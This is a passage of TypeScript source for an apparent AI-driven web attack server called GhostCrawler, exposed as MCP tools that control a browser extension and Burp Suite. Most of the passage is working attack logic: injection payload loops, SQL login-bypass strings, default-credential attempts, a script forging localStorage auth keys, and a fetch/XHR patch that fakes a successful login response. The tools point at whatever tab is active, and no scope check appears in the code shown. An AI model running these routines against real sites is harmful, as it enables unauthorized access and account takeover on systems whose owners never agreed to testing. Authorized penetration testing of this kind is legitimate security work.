              scanState.currentTest = `SQLi → ${selector}`;
              try {
                const { preText, postText, postUrl } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
                const evidence = detectSQLiErrors(postText, preText);
                if (evidence) {
                  formFindings.push({ type: "SQL Injection", severity: "High", endpoint: activeUrl, param: selector, payload, evidence });
                  console.error(`[Scan] ✗ SQLi in ${selector}: ${evidence}`);
                  break;
                }
                // Stop if input is being encoded (no point continuing)
                if (isSQLiEncoded(postText, preText)) {
                  console.error(`[Scan] Encoding detected mid-loop for ${selector} — stopping SQLi`);
                  break;
                }
                // Form navigated away unexpectedly — stop testing this field
                if (postUrl && postUrl !== activeUrl) break;
              } catch (e) { console.error(`[Scan] SQLi test error ${selector}:`, String(e).slice(0, 80)); }
              scanState.completedTests++;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          }
        }

        if (attackType === "authinject" && skillPlan.ui.sqli) {
          const authPayloads = ["' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 1=1#", "') OR ('1'='1"];
          let authSkip = false;
          try {
            logActivity(`Testing auth injection on ${selector}`, `Trying SQL auth bypass payloads on ${selector}`);
            const { preText: authPre, postText: authProbePost } = await smartFormTest(activeUrl, selector, authPayloads[0], selectors.submitSelector);
            const evidence = detectSQLiErrors(authProbePost, authPre);
            const landed = await sendExtensionCommand("get_url", {}, 4000).catch(() => null);
            const landedAtPanel = landed?.url && !landed.url.includes("/challenge/") || (landed?.url && landed.url.includes("panel"));
            if (evidence || landedAtPanel) {
              formFindings.push({ type: "Auth Bypass (SQLi)", severity: "Critical", endpoint: activeUrl, param: selector, payload: authPayloads[0], evidence: evidence || "Navigated to authenticated page" });
              logActivity(`Auth injection confirmed on ${selector}`, `SQL auth bypass confirmed`);
              authSkip = true;
              scanState.completedTests += authPayloads.length;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          } catch { /* non-critical */ }

          if (!authSkip) {
            for (const payload of authPayloads) {
              if (scanAbortFlag) break;
              scanState.currentTest = `Auth SQLi → ${selector}`;
              try {
                const { preText, postText, postUrl } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
                const urlChanged = postUrl !== activeUrl;
                const evidence = detectSQLiErrors(postText, preText);
                if (evidence || urlChanged) {
                  formFindings.push({
                    type: "Auth Bypass (SQLi)",
                    severity: "Critical",
                    endpoint: activeUrl,
                    param: selector,
                    payload,
                    evidence: evidence || `URL changed to ${postUrl} - possible auth bypass`,
                  });
                  console.error(`[Scan] ✗ Auth bypass in ${selector}`);
                  break;
                }
              } catch (e) { console.error(`[Scan] Auth SQLi error ${selector}:`, String(e).slice(0, 80)); }
              scanState.completedTests++;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          }
        }

        if (attackType === "ssti") {
          for (const payload of sstiPayloads) {
            if (scanAbortFlag) break;
            scanState.currentTest = `SSTI → ${selector}`;
            try {
              const { preText, postText } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
              const evidence = detectSSTI(postText, preText);
              if (evidence) {
                formFindings.push({ type: "SSTI", severity: "Critical", endpoint: activeUrl, param: selector, payload, evidence });
                console.error(`[Scan] ✗ SSTI in ${selector}: ${evidence}`);
                break;
              }
            } catch (e) { console.error(`[Scan] SSTI test error ${selector}:`, String(e).slice(0, 80)); }
            scanState.completedTests++;
            scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
          }
        }

        if (attackType === "cmdi") {
          for (const payload of cmdiPayloads) {
            if (scanAbortFlag) break;
            scanState.currentTest = `CMDi → ${selector}`;
            try {
              const { preText, postText } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
              const evidence = detectCMDi(postText, preText);
              if (evidence) {
                formFindings.push({ type: "Command Injection", severity: "Critical", endpoint: activeUrl, param: selector, payload, evidence });
                console.error(`[Scan] ✗ CMDi in ${selector}: ${evidence}`);
                break;
              }
            } catch (e) { console.error(`[Scan] CMDi test error ${selector}:`, String(e).slice(0, 80)); }
            scanState.completedTests++;
            scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
          }
        }

        if (attackType === "openredirect") {
          for (const payload of openRedirectPayloads) {
            if (scanAbortFlag) break;
            scanState.currentTest = `OpenRedirect → ${selector}`;
            try {
              const { postUrl } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
              const redirected = postUrl && !postUrl.includes(new URL(activeUrl).hostname);
              if (redirected) {
                formFindings.push({
                  type: "Open Redirect",
                  severity: "Medium",
                  endpoint: activeUrl,
                  param: selector,
                  payload,
                  evidence: `Redirected to ${postUrl}`,
                });
                console.error(`[Scan] ✗ Open redirect in ${selector} → ${postUrl}`);
                break;
              }
            } catch (e) { console.error(`[Scan] OpenRedirect error ${selector}:`, String(e).slice(0, 80)); }
            scanState.completedTests++;
            scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
          }
        }

        if (attackType === "pathtraversal") {
          for (const payload of pathTraversalPayloads) {
            if (scanAbortFlag) break;
            scanState.currentTest = `PathTraversal → ${selector}`;
            try {
              const { postText } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
              const evidence = /root:[x*]?:0:0|daemon:|bin:\/bin/.test(postText)
                ? "Possible /etc/passwd content in response"
                : null;
              if (evidence) {
                formFindings.push({ type: "Path Traversal / LFI", severity: "High", endpoint: activeUrl, param: selector, payload, evidence });
                console.error(`[Scan] ✗ Path traversal in ${selector}`);
                break;
              }
            } catch (e) { console.error(`[Scan] PathTraversal error ${selector}:`, String(e).slice(0, 80)); }
            scanState.completedTests++;
            scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
          }
        }
      }
    }
  }

  // ── localStorage/sessionStorage auth bypass ───────────────────────────────────
  // "Client-Side Access Control Logic" finding means JS reads a storage key to
  // gate routing. Try setting plausible "authenticated" keys to truthy values
  // and navigating to the protected page — if it sticks, the check is bypassable.
  const clientSideAuthFinding = earlySourceFindings.find(f => f.type === "Client-Side Access Control Logic");
  if (!scanAbortFlag && clientSideAuthFinding) {
    try {
      scanState.currentTest = "Phase 2/2: localStorage auth bypass";
      logActivity("Testing localStorage/sessionStorage auth bypass");
      const authKeys = ["token", "auth", "session", "authenticated", "loggedIn", "logged_in", "user", "isAdmin", "role", "access"];
      const panelUrl = activeUrl.replace(/\/+$/, "") + "/panel";
      await sendExtensionCommand("execute_script", {
        script: `(function(){
          var keys = ${JSON.stringify(authKeys)};
          keys.forEach(function(k){
            localStorage.setItem(k, 'true');
            localStorage.setItem(k, '1');
            sessionStorage.setItem(k, 'true');
          });
          localStorage.setItem('role', 'admin');
          localStorage.setItem('user', JSON.stringify({role:'admin',authenticated:true}));
        })();`,
      }, 5000).catch(() => null);
      await sendExtensionCommand("browser_action", { action: "navigate", url: panelUrl }, 8000).catch(() => {});
      await new Promise(r => setTimeout(r, 2500));
      const storageNav = await sendExtensionCommand("get_url", {}, 4000).catch(() => null);
      const storageUrl = String(storageNav?.url || "");
      if (storageUrl.includes("panel") && !storageUrl.includes("login")) {
        const finding = {
          type: "Auth Bypass via localStorage Manipulation (Confirmed)",
          severity: "Critical",
          endpoint: `GET ${panelUrl}`,
          param: "localStorage auth keys",
          payload: authKeys.map(k => `${k}=true`).join("; "),
          evidence: `Setting localStorage auth keys allowed direct navigation to ${storageUrl} without credentials. Client-side only auth check — no server-side session validation.`,
        };
        formFindings.push(finding);
        await sendExtensionCommand("hud-push", { findings: [finding] }, 3000).catch(() => null);
        await sendFindingToBurp("Critical", `localStorage Bypass - ${new URL(panelUrl).pathname}`, "GET", panelUrl, {}, "").catch(() => {});
        logActivity(`localStorage bypass confirmed — accessed ${storageUrl}`);
      } else {
        // Clean up forged keys so they don't affect the rest of the scan
        await sendExtensionCommand("execute_script", {
          script: `(function(){ var keys = ${JSON.stringify(authKeys)}; keys.forEach(function(k){ localStorage.removeItem(k); sessionStorage.removeItem(k); }); })();`,
        }, 3000).catch(() => null);
      }
    } catch (lsErr: any) {
      console.error("[Scan] localStorage bypass test error:", String(lsErr).slice(0, 100));
    }
  }


  if (
    skillPlan.ui.defaultCreds &&
    selectors.usernameSelector &&
    selectors.passwordSelector
  ) {
    // Navigate to login page once and capture baseline
    try {
      await sendExtensionCommand("browser_action", { action: "navigate", url: activeUrl }, timeoutMs);
      await new Promise((r) => setTimeout(r, settleMs));
    } catch { /* non-critical */ }
    const loginBaseState = await sendExtensionCommand("browser_action", { action: "get_page_state" }, 5000).catch(() => null);
    const loginBaseUrl = String(loginBaseState?.result?.url || loginBaseState?.url || activeUrl);

    for (const cred of testCreds) {
      if (scanAbortFlag) break;
      scanState.currentTest = `Phase 2/2: default creds ${cred.username}`;
      try {
        // Navigate back to login page before each attempt
        await sendExtensionCommand("browser_action", { action: "navigate", url: activeUrl }, timeoutMs);
        await new Promise((r) => setTimeout(r, settleMs));

        await sendExtensionCommand("browser_action", {
          action: "type",
          selector: selectors.usernameSelector,
          text: cred.username,
          clearFirst: true,
        }, 8000);
        await sendExtensionCommand("browser_action", {
          action: "type",
          selector: selectors.passwordSelector,
          text: cred.password,
          clearFirst: true,
        }, 8000);
        await sendExtensionCommand("browser_action", {
          action: "click",
          selector: selectors.submitSelector,
        }, 8000);
        await new Promise((r) => setTimeout(r, settleMs));

        const postState = await sendExtensionCommand("browser_action", { action: "get_page_state" }, 5000).catch(() => null);
        const postUrl = String(postState?.result?.url || postState?.url || "");
        const postText = String(postState?.result?.text || postState?.text || "");
        const loginErrorPatterns = /invalid|incorrect|failed|error|wrong|denied|unauthorized/i;
        // Success indicators: URL changed (navigated away from login) OR no error + page changed
        const urlChanged = postUrl !== loginBaseUrl && postUrl !== "" && postUrl !== activeUrl;
        const noError = !loginErrorPatterns.test(postText);
        if (urlChanged || (noError && postText.length > 100)) {
          formFindings.push({
            type: "Default Credentials",
            severity: "Critical",
            endpoint: activeUrl,
            param: `${selectors.usernameSelector}/${selectors.passwordSelector}`,
            payload: `${cred.username}:${cred.password}`,
            evidence: urlChanged
              ? `Login redirected to ${postUrl}`
              : "Login appeared successful — no error message, page changed",
          });
          console.error(`[Scan] ✗ Default credentials worked: ${cred.username}:${cred.password}`);
          break;
        }
      } catch (error) {
        console.error(`[Scan] Default creds test failed:`, String(error).slice(0, 100));
      }
      scanState.completedTests++;
      scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
    }
  }

  // ── Response manipulation bypass ──────────────────────────────────────────────
  // Some apps do auth checks client-side by inspecting the JSON response body
  // (e.g. {"success":false} → show error; {"success":true} → navigate).
  // If the login endpoint returns a readable JSON body, flip the failure
  // indicators and see if submitting an intercepted "success" response lets us in.
  if (!scanAbortFlag && selectors.usernameSelector && selectors.passwordSelector) {
    try {
      scanState.currentTest = "Phase 2/2: response manipulation bypass";
      logActivity("Testing response manipulation bypass on login form");
      // Step 1: submit a bad login to capture the raw JSON response shape
      const badLoginResp = await sendRequestThroughBurp(
        "POST",
        activeUrl,
        { "Content-Type": "application/x-www-form-urlencoded" },
        `${selectors.usernameSelector.replace(/.*\[name="(.+?)"\].*/, "$1")}=probe_user&` +
        `${selectors.passwordSelector.replace(/.*\[name="(.+?)"\].*/, "$1")}=probe_pass`
      ).catch(() => null);

      if (badLoginResp && badLoginResp.status < 500) {
        let body = badLoginResp.body ?? "";
        // Step 2: detect JSON failure patterns
        const isJsonFail = /\{.*"(success|ok|status|result|auth|authenticated|loggedIn|logged_in)"\s*:\s*(false|0|"fail"|"error"|"failed"|"no"|"unauthorized")/i.test(body);
        // Step 3: check if the app uses the response to gate navigation (client-side auth)
        const clientSideAuth = earlySourceFindings.some(f => f.type === "Client-Side Access Control Logic");
        if (isJsonFail || clientSideAuth) {
          // Build the "success" version of the response
          const manipulated = body
            .replace(/"(success|ok|auth|authenticated|loggedIn|logged_in)"\s*:\s*false/gi, '"$1": true')
            .replace(/"(success|ok|auth|authenticated|loggedIn|logged_in)"\s*:\s*0/gi, '"$1": 1')
            .replace(/"(success|ok|auth|authenticated|loggedIn|logged_in)"\s*:\s*"(fail|error|failed|no|unauthorized)"/gi, '"$1": "success"')
            .replace(/"(status|result)"\s*:\s*"(fail|error|failed|unauthorized)"/gi, '"$1": "ok"');

          if (manipulated !== body) {
            // Step 4: use execute_script to intercept the fetch response client-side
            // by overriding window.fetch to return the manipulated response body,
            // then submit the form normally so the app's JS logic runs on the forged data.
            const injectResult = await sendExtensionCommand("execute_script", {
              script: `(function(){
                var origFetch = window.fetch;
                var manipulated = ${JSON.stringify(manipulated)};
                window.fetch = function(url, opts) {
                  return origFetch(url, opts).then(function(r) {
                    if (r.url && r.url.includes(${JSON.stringify(new URL(activeUrl).pathname)})) {
                      return new Response(manipulated, { status: 200, headers: { 'Content-Type': 'application/json' } });
                    }
                    return r;
                  });
                };
                // Also patch XMLHttpRequest
                var origOpen = XMLHttpRequest.prototype.open;
                // Mark xhrs to the login path so we can intercept
                XMLHttpRequest.prototype.open = function(method, url) {
                  if (String(url).includes(${JSON.stringify(new URL(activeUrl).pathname)})) this._gcIntercept = true;
                  return origOpen.apply(this, arguments);
                };
                var origSend = XMLHttpRequest.prototype.send;
                XMLHttpRequest.prototype.send = function() {
                  if (this._gcIntercept) {
                    var self = this;
                    var origOnLoad = this.onload;
                    Object.defineProperty(self, 'responseText', { get: function() { return manipulated; }, configurable: true });
                    Object.defineProperty(self, 'response', { get: function() { return manipulated; }, configurable: true });
                  }
                  return origSend.apply(this, arguments);
                };
                return 'patched';
              })();`,
            }, 5000).catch(() => null);

            if (injectResult?.value === "patched" || injectResult?.result === "patched") {
              // Navigate and submit form with dummy creds — app will receive forged success
              await sendExtensionCommand("browser_action", { action: "navigate", url: activeUrl }, 8000).catch(() => {});
              await new Promise(r => setTimeout(r, 1500));
              await sendExtensionCommand("browser_action", { action: "type", selector: selectors.usernameSelector!, text: "admin", clearFirst: true }, 5000).catch(() => {});
              await sendExtensionCommand("browser_action", { action: "type", selector: selectors.passwordSelector!, text: "wrongpassword", clearFirst: true }, 5000).catch(() => {});
              await sendExtensionCommand("browser_action", { action: "click", selector: selectors.submitSelector }, 6000).catch(() => {});
              await new Promise(r => setTimeout(r, 3000));

              const afterNav = await sendExtensionCommand("get_url", {}, 4000).catch(() => null);
              const afterUrl = String(afterNav?.url || "");
              const loggedIn = afterUrl !== activeUrl && afterUrl.length > 0 &&
                               !/login|signin|auth/i.test(afterUrl);

              if (loggedIn) {
                const finding = {
                  type: "Auth Bypass via Response Manipulation (Confirmed)",
                  severity: "Critical",
                  endpoint: `POST ${activeUrl}`,
                  param: "login response body",
                  payload: `Flipped success=false→true in fetch/XHR response`,
                  evidence: `Client-side auth check relies on JSON response body. Intercepting and flipping "success":false → true caused navigation to ${afterUrl}. App does not validate auth server-side on the navigation step.`,
                };
                formFindings.push(finding);
                await sendExtensionCommand("hud-push", { findings: [finding] }, 3000).catch(() => null);
                await sendFindingToBurp("Critical", `Response Manipulation - ${new URL(activeUrl).pathname}`, "POST", activeUrl,
                  { "Content-Type": "application/x-www-form-urlencoded" },
                  `Intercept login POST response, change: ${body.slice(0, 120)} → ${manipulated.slice(0, 120)}`
                ).catch(() => {});
                logActivity(`Response manipulation bypass confirmed — navigated to ${afterUrl}`);
              } else {
                console.error("[Scan] Response manipulation: fetch patch applied but no navigation — server-side auth likely enforced");
              }
            }
          }
        }
      }
    } catch (rmErr: any) {
      console.error("[Scan] Response manipulation test error:", String(rmErr).slice(0, 100));
    }
  }

  // Use existing Burp-proxied API attack engine for endpoint testing.
  if (discoveredEndpoints.size > 0) {
    const mergedSurface = {
      timestamp: new Date().toISOString(),
      scan: {
        page: activeSurface?.page || { title: "", url: activeUrl },
        findings: activeSurface?.findings || [],
        buttons: activeSurface?.buttons || [],
        forms: activeSurface?.forms || [],
        endpoints: Array.from(discoveredEndpoints.values()),
        scannedAt: new Date().toISOString(),
      },
    };

    currentAttackSurface = mergedSurface as AttackSurface;
    scanState.currentTest = "Phase 2/2: Burp-proxied endpoint attacks";
    await runLiveScan(true);
  }

  const mergedFindings = [...scanState.vulnerabilities, ...formFindings];
  scanState.vulnerabilities = mergedFindings;
  setPhase("complete");
  logActivity(`Scan complete — ${mergedFindings.length} finding(s) discovered`);
  scanState.status = "completed";
  scanState.progress = 100;
  scanState.currentTest = `Completed: ${mergedFindings.length} finding(s)`;

  // Post-scan: pull Burp scanner issues and merge any new findings
  let burpScannerIssues: any[] = [];
  try {
    const toolName = burpMCPToolNames.find(n => /scanner|issues/i.test(n));
    if (!toolName) throw new Error("Burp scanner tool not available in this extension");
    const burpResult = await callBurpMCP(toolName, {});
    const issues: any[] = burpResult?.issues ?? burpResult?.content ?? [];
    burpScannerIssues = issues.map((issue: any) => ({
      type: issue.name ?? issue.issueName ?? "Burp Scanner Finding",
      severity: issue.severity ?? "Medium",
      endpoint: issue.url ?? issue.endpoint ?? "",
      evidence: issue.detail ?? issue.issueDetail ?? "Detected by Burp Active/Passive Scanner",
      source: "burp-scanner",
    }));
    if (burpScannerIssues.length) {
      console.error(`[BurpMCP] Merged ${burpScannerIssues.length} Burp scanner issue(s)`);
      mergedFindings.push(...burpScannerIssues);
    }
  } catch {
    // Burp scanner pull is optional
  }

  return {
    phases: ["scan-features", "attack-features"],
    attackGuideline: skillPlan.guideline,
    owaspCoverage: {
      a02_cryptographic_failures: true,
      a03_injection: true,
      a05_misconfiguration: true,
      a06_vulnerable_components: true,
      a07_authentication_failures: true,
      a09_logging_monitoring: false,
      a10_ssrf: true,
      a01_access_control: discoveredEndpoints.size > 0,
    },
    pagesVisited: visitedUrls.size,
    discoveredSurfaces: discoveredSurfaces.length,
    discoveredEndpoints: discoveredEndpoints.size,
    attackPlan: {
      ui: skillPlan.ui,
      api: skillPlan.api,
    },
    serverTech: serverTechFindings,
    findings: mergedFindings,
    pocs: mergedFindings
      .filter((f: any) => f.poc)
      .map((f: any) => ({ type: f.type, endpoint: f.endpoint, poc: f.poc })),
    summary: {
      totalFindings: mergedFindings.length,
      highOrCritical: mergedFindings.filter((finding: any) => /high|critical/i.test(finding.severity)).length,
      serverTechDetected: serverTechFindings.map((f) => f.name),
      burpScannerIssues: burpScannerIssues.length,
      bySeverity: {
        critical: mergedFindings.filter((f: any) => /critical/i.test(f.severity)).length,
        high: mergedFindings.filter((f: any) => /^high$/i.test(f.severity)).length,
        medium: mergedFindings.filter((f: any) => /medium/i.test(f.severity)).length,
        low: mergedFindings.filter((f: any) => /^low$/i.test(f.severity)).length,
        info: mergedFindings.filter((f: any) => /info/i.test(f.severity)).length,
      },
    },
  };
}

// ══════════════════════════════════════════════════════════════════════
// MCP Server Setup
// ══════════════════════════════════════════════════════════════════════

const server = new Server(
  {
    name: "ghostcrawler-mcp-server",
    version: "0.1.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// ──────────────────────────────────────────────────────────────────────
// Tool: Get Current Attack Surface
// ──────────────────────────────────────────────────────────────────────

server.setRequestHandler(ListToolsRequestSchema, async () => {
  return {
    tools: [
      {
        name: "get_attack_surface",
        description: "Get page info, forms, buttons, and API endpoints from the active browser tab.",
        inputSchema: {
          type: "object",
          properties: {},
        },
      },
      {
        name: "run_browser_plan",
        description: "Execute browser actions (navigate/type/click/extract_text) on the active tab, optionally followed by a live scan.",
        inputSchema: {
          type: "object",
          properties: {
            steps: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  action: {
                    type: "string",
                    enum: ["click", "type", "navigate", "extract_text"],
                  },
                  selector: { type: "string" },
                  text: { type: "string" },
                  url: { type: "string" },
                },
                required: ["action"],
              },
            },
            stepDelayMs: {
              type: "number",
              description: "Delay between steps in ms (default: 400)",
            },
            startLiveScan: {
              type: "boolean",
              description: "If true, starts a live scan after plan execution",
            },
            liveScanAction: {
              type: "string",
              enum: ["trigger-all", "trigger-one", "trigger_all", "trigger_one"],
            },
          },
          required: ["steps"],
        },
      },
      {
        name: "observe_dom_changes",
        description: "Watch live DOM mutations on the active page for a set duration.",
        inputSchema: {
          type: "object",
          properties: {
            durationMs: { type: "number", description: "How long to observe (default 5000ms)" },
            selector: { type: "string", description: "Optional CSS selector to scope observation" },
            maxEvents: { type: "number", description: "Max events to keep (default 200)" },
          },
        },
      },
      {
        name: "run_attack_command",
        description: "Fire a targeted attack (xss, manual-sqli, default-creds, http-verb, custom-request) through the browser.",
        inputSchema: {
          type: "object",
          properties: {
            attack: {
              type: "string",
              enum: ["xss", "default-creds", "manual-sqli", "http-verb", "custom-request"],
            },
            payload: { type: "string" },
            selector: { type: "string" },
            submitSelector: { type: "string" },
            usernameSelector: { type: "string" },
            passwordSelector: { type: "string" },
            username: { type: "string" },
            password: { type: "string" },
            credentials: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  username: { type: "string" },
                  password: { type: "string" },
                },
              },
            },
            url: { type: "string" },
            method: { type: "string" },
            body: { type: "string" },
            headers: { type: "object" },
            observeMs: { type: "number", description: "Capture DOM changes during attack" },
            observeSelector: { type: "string" },
            timeoutMs: { type: "number" },
          },
          required: ["attack"],
        },
      },
      {
        name: "auto_crawl",
        description: "Crawl + attack the active page: runs XSS, SQLi, default-creds on all form fields and follows links.",
        inputSchema: {
          type: "object",
          properties: {
            maxDepth: { type: "number", description: "Navigation depth (default 1)" },
            attacks: {
              type: "array",
              items: { type: "string", enum: ["xss", "manual-sqli", "default-creds"] },
              description: "Attack types to run (default: all three)",
            },
            observeMs: { type: "number", description: "DOM observation window per attack in ms (default 2000)" },
          },
        },
      },
      {
        name: "pentest_active_tab",
        description: "Full OWASP Top 10 scan on the active tab: source review, fingerprint, crawl, XSS/SQLi/default-creds. Auto-logs findings to Burp Repeater. Default entry point — no arguments needed.",
        inputSchema: {
          type: "object",
          properties: {
            preset: {
              type: "string",
              enum: ["quick", "full", "auth", "api"],
              description: "quick=single page, full=depth 2 all attacks (default), auth=logged-in session, api=JSON endpoints",
            },
          },
        },
      },
      {
        name: "check_burp_mcp",
        description: "Verify Burp Suite MCP connection on :9876 and list available tools.",
        inputSchema: { type: "object", properties: {} },
      },
      {
        name: "gc_doctor",
        description: "Diagnose GhostCrawler end-to-end (bridge, extension, Burp MCP). Run first on any failure.",
        inputSchema: { type: "object", properties: {} },
      },
      {
        name: "get_pending_probe",
        description: "Poll for a pending AI probe (field, attack type, payload, before/after response). Returns null if none pending.",
        inputSchema: { type: "object", properties: {} },
      },
      {
        name: "submit_probe_decision",
        description: "Decide on a pending probe: skip (safe), continue (fire more payloads), or vulnerable (confirmed). Always include a reason.",
        inputSchema: {
          type: "object",
          properties: {
            decision: { type: "string", enum: ["skip", "continue", "vulnerable"] },
            reason: { type: "string" },
          },
          required: ["decision", "reason"],
        },
      },
      {
        name: "report_finding",
        description: "Register a manually confirmed vulnerability into the GhostCrawler HUD and send it to Burp Repeater. Call this whenever you have confirmed an exploit in chat (auth bypass, IDOR, XSS, open redirect, etc.). Severity must be one of: Critical, High, Medium, Low, Info.",
        inputSchema: {
          type: "object",
          properties: {
            type:     { type: "string", description: "Short finding label, e.g. 'Stored XSS via innerHTML'" },
            severity: { type: "string", enum: ["Critical", "High", "Medium", "Low", "Info"] },
            endpoint: { type: "string", description: "Full URL, optionally prefixed with HTTP method: 'POST https://target.com/login'" },
            param:    { type: "string", description: "Affected parameter or field name" },
            payload:  { type: "string", description: "Payload or value used to trigger the vulnerability" },
            evidence: { type: "string", description: "Proof of exploitation — what happened and how it was confirmed" },
            method:   { type: "string", description: "HTTP method (GET/POST/etc). Overrides method prefix in endpoint." },
            body:     { type: "string", description: "Request body to replay in Burp Repeater" },
            headers:  { type: "object", description: "Request headers to include in Burp Repeater tab" },
          },
          required: ["type", "severity", "endpoint"],
        },
      },
    ],
  };
});

// ──────────────────────────────────────────────────────────────────────
// Tool Handlers
// ──────────────────────────────────────────────────────────────────────

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;

  // When the AI calls any tool after a scan has finished, flip the HUD status
  // to "agent-active" so the poll interval stays alive and the user can watch
  // the AI's follow-up work (manual exploits, browser plans, etc.) in real time.
  const SCAN_TOOLS = new Set(["pentest_active_tab", "auto_crawl", "gc_doctor", "check_burp_mcp"]);
  if (!SCAN_TOOLS.has(name) && (scanState.status === "completed" || scanState.status === "stopped")) {
    scanState.status = "agent-active";
  }
  _lastToolCallMs = Date.now(); // reset idle watchdog on every tool call
  // Log every tool invocation to the activity feed so the HUD shows what's happening.
  const TOOL_LABELS: Record<string, string> = {
    run_browser_plan:      "Executing browser action sequence",
    run_attack_command:    "Firing targeted attack",
    get_attack_surface:    "Mapping attack surface",
    observe_dom_changes:   "Observing DOM for mutations",
    start_live_scan:       "Starting live scan",
    get_pending_probe:     "Checking pending probe",
    submit_probe_decision: "Submitting probe decision",
  };
  if (TOOL_LABELS[name]) {
    logActivity(TOOL_LABELS[name]);
  }

  try {
    switch (name) {
      case "get_attack_surface": {
        if (!currentAttackSurface) {
          return {
            content: [
              {
                type: "text",
                text: "No attack surface available. The browser extension has not sent any scan data yet.",
              },
            ],
          };
        }

        return {
          content: [
            {
              type: "text",
              text: JSON.stringify(currentAttackSurface, null, 2),
            },
          ],
        };
      }

      case "start_live_scan": {
        const rawAction = ((args as any)?.action as string) || "trigger-all";
        const action = rawAction.replaceAll("_", "-");

        console.error(`[MCP Tool] start_live_scan: ${action}`);

        scanAbortFlag = false;
        resetVulnDedup();
        scanState = {
          status: "scanning",
          currentTest: `Initializing scan and capturing page...`,
          progress: 0,
          vulnerabilities: [],
          totalTests: 0,
          completedTests: 0,
          phase: "",
          reasoning: "",
          activityLog: [],
        };

        // STEP 1: First, capture the page by sending scan command
        pendingCommand = {
          type: "scan",
          payload: {},
          commandId: Date.now().toString(),
        };

        console.error(`[MCP Tool] Queued scan command to capture attack surface`);

        // Wait for attack surface to be captured (max 5 seconds)
        let waitCount = 0;
        while (!currentAttackSurface && waitCount < 25) {
          await new Promise((resolve) => setTimeout(resolve, 200));
          waitCount++;
        }

        if (!currentAttackSurface) {
          return {
            content: [
              {
                type: "text",
                text: "❌ **Error**: Could not capture page attack surface.\n\n**Troubleshooting:**\n1. Make sure Ghostcrawler extension is loaded in your browser\n2. Make sure MCP is enabled in the extension popup\n3. Navigate to a web application in the browser\n4. Try again",
              },
            ],
          };
        }

        console.error(`[MCP Tool] Attack surface captured: ${currentAttackSurface.scan.page.url}`);

        // STEP 2: Now trigger buttons with the specified action
        if (action === "trigger-all") {
          pendingCommand = {
            type: "trigger",
            payload: { delayMs: 700, formValues: {} },
            commandId: Date.now().toString(),
          };
        } else if (action === "trigger-one") {
          pendingCommand = {
            type: "trigger_button",
            payload: { index: 0, formValues: {} },
            commandId: Date.now().toString(),
          };
        } else {
          return {
            content: [
              {
                type: "text",
                text: `❌ Invalid action: ${rawAction}. Use "trigger-all" / "trigger_all" or "trigger-one" / "trigger_one".`,
              },
            ],
          };
        }

        console.error(`[MCP Tool] Queued trigger command: ${action}`);

        // STEP 3: Run vulnerability tests in background
        runLiveScan().catch((error) => {
          console.error("[Scan] Error:", error);
          scanState.status = "stopped";
        });

        return {
          content: [
            {
              type: "text",
              text: `🚀 **LIVE SCAN STARTED** (${action})\n\n**Page:** ${currentAttackSurface.scan.page.url}\n**Buttons:** ${currentAttackSurface.scan.buttons.length || 0}\n**Forms:** ${currentAttackSurface.scan.forms.length || 0}\n**Endpoints:** ${currentAttackSurface.scan.endpoints.length || 0}\n\n✓ Triggering buttons...\n✓ Capturing new API endpoints...\n✓ Testing for SQLi, XSS, IDOR, Command Injection...\n\n**Watch Burp HTTP History for live requests!**\n\nResults will appear as vulnerabilities are found...`,
            },
          ],
        };
      }

      case "browser_action": {
        const input = (args as any) || {};
        const action = input.action as string;

        if (!action) {
          return {
            content: [{ type: "text", text: "❌ Missing required field: action" }],
            isError: true,
          };
        }

        const commandId = Date.now().toString();
        pendingResult = null;
        pendingCommand = {
          type: "browser_action",
          payload: {
            action,
            selector: input.selector,
            text: input.text,
            url: input.url,
          },
          commandId,
        };

        const result = await waitForCommandResult(commandId, Number(input.timeoutMs || 15000));
        if (!result) {
          return {
            content: [
              {
                type: "text",
                text: "❌ Timeout waiting for browser action result. Ensure extension is loaded on the active tab.",
              },
            ],
            isError: true,
          };
        }

        if (!result.success) {
          return {
            content: [{ type: "text", text: `❌ Browser action failed: ${result.error || "unknown error"}` }],
            isError: true,
          };
        }

        return {
          content: [
            {
              type: "text",
              text: `✅ Browser action completed: ${action}\n${JSON.stringify(result.result, null, 2)}`,
            },
          ],
        };
      }

      case "run_browser_plan": {
        const input = (args as any) || {};
        const steps = Array.isArray(input.steps) ? input.steps : [];
        const stepDelayMs = Number(input.stepDelayMs ?? 400);

        if (!steps.length) {
          return {
            content: [{ type: "text", text: "❌ Missing or empty steps array" }],
            isError: true,
          };
        }

        const planResults: any[] = [];

        for (let i = 0; i < steps.length; i++) {
          const step = steps[i] || {};
          const commandId = `${Date.now()}-${i}`;

          pendingResult = null;
          pendingCommand = {
            type: "browser_action",
            payload: {
              action: step.action,
              selector: step.selector,
              text: step.text,
              url: step.url,
            },
            commandId,
          };

          const result = await waitForCommandResult(commandId, 15000);
          if (!result) {
            return {
              content: [
                {
                  type: "text",
                  text: `❌ Plan timed out at step ${i + 1}: ${JSON.stringify(step)}`,
                },
              ],
              isError: true,
            };
          }

          if (!result.success) {
            return {
              content: [
                {
                  type: "text",
                  text: `❌ Plan failed at step ${i + 1}: ${result.error || "unknown error"}`,
                },
              ],
              isError: true,
            };
          }

          planResults.push({ step: i + 1, input: step, output: result.result });

          if (stepDelayMs > 0 && i < steps.length - 1) {
            await new Promise((resolve) => setTimeout(resolve, stepDelayMs));
          }
        }

        if (input.startLiveScan) {
          const rawAction = (input.liveScanAction as string) || "trigger-all";
